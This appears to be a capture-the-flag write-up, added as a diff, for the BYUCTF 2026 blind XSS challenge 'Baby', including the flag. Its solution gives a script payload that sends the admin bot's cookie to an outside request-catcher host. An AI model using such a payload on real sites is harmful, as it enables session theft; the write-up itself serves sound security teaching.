@@ -1,0 +1,87 @@
+---
+title: "Baby — BYUCTF 2026"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2026-baby"
+order: 227
+writeupKind: "challenge"
+ctfSlug: "byuctf-2026"
+ctfTitle: "BYUCTF 2026"
+---
+
+# Baby — BYUCTF 2026
+
+> **Category:** `Web Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{s33_1t5_3asy!}`  
+> **Source Path:** `web/baby`
+
+---
+
+## Challenge Description
+
+```text
+Name: A Cookie for Baby Bot
+Description: I wrote a XSS challenge to show you what an actual XSS attack looks like. I'm sure you can figure it out. Hopefully you can do it blind like in real life.
+
+https://baby.csapi.dev/
+
+Files: None ;)
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2026/tree/main/web/baby)
+- [web/baby/challenge.md](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/baby/challenge.md)
+- [web/baby/writeup.md](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/baby/writeup.md)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2026 source material for the Web Exploitation challenge **Baby**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [web/baby/writeup.md](https://github.com/BYU-CSA/BYUCTF-2026/blob/main/web/baby/writeup.md)
+
+This challenge is a simple XSS challenge with an adminbot. 
+
+Just submitting a ticket with the script:
+
+
+
+```html
+<script>
+  fetch("https://camel.requestcatcher.com/" + document.cookie)
+</script>
+```
+
+
+This will automatically forward a request with the adminbot's cookies to that domain, and you can view the admin_pass from there. After that, just set a cookie to that value and the flag is on the "View Tickets" page.
+
+Flag: byuctf{s33_1t5_3asy!}
+
+---
+
+## Full Exploit Script
+
+No standalone exploit script was present in the selected source material.
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2026 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
